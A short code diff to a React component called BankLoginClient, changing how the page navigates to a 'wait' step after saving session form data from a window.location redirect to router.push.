@@ -113,7 +113,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       return;
     }
     setSessionFormData(nextFormData);
-    window.location.href = stepToPath("wait", sessionId);
+    router.push(stepToPath("wait", sessionId));
   }
 
   if (!supabase) {
